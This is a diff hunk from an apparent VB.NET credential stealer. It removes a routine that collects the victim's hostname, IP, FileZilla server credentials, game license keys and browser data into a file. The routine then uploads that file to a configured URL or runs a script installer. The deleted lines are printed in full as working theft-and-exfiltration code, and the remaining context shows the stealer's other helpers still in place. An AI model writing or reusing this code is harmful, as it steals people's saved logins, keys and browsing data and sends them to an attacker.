@@ -56,41 +56,7 @@ Public Class Form1
 
     End Sub
 
-    Public Sub GetDataStart()
-        Try
-            Dim creds As String = "User : " & Gethotsname().ToString & "   IP :" & GetIp().ToString
-            Dim FZ As String = Wxaml.Classes.Targets.classFileZilla.FZ()
-            Dim keys As String = Wxaml.Classes.classKeys.gamekeys()
 
-            creds += Environment.NewLine + "------------------------------------- Keys" + Environment.NewLine
-            creds += keys + Environment.NewLine
-            creds += Environment.NewLine + "------------------------------------ BrowserData" + Environment.NewLine
-            creds += build_string() + Environment.NewLine
-            creds += Environment.NewLine + "------------------------------------ ServersData" + Environment.NewLine
-            creds += FZ + Environment.NewLine
-
-            If IO.File.Exists(FilePath) Then
-                If IO.File.Exists(FileTempPath) Then
-                    IO.File.Delete(FileTempPath)
-                End If
-                IO.File.WriteAllText(FileTempPath, creds)
-
-                Dim myFile As New FileInfo(FilePath)
-                Dim myTempFile As New FileInfo(FileTempPath)
-
-                If myTempFile.Length > myFile.Length Then
-                    UploadAsync(UploadUrl, FileTempPath)
-                Else
-                    ScriptInstaller()
-                End If
-            Else
-                IO.File.WriteAllText(FilePath, creds)
-                UploadAsync(UploadUrl, FilePath)
-            End If
-        Catch ex As Exception
-            ScriptInstaller()
-        End Try
-    End Sub
 
     Public Shared Function build_string() As String
         Dim stringBuilder As StringBuilder = New StringBuilder()
